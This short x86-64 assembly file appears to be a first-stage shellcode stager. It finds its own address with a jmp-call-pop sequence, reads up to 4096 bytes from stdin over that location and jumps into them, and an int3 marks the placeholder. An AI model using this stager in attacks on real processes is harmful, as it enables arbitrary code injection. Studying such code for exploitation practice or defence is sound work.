        .intel_syntax noprefix
        .globl _start
_start:
        jmp caller
callee:
        pop rsi
        xor rdi, rdi
        lea rdx, [rdi+1]
        shl rdx, 12
        xor rax, rax      /* read */
        syscall
        jmp stage
caller:
        call callee
stage:
        int3
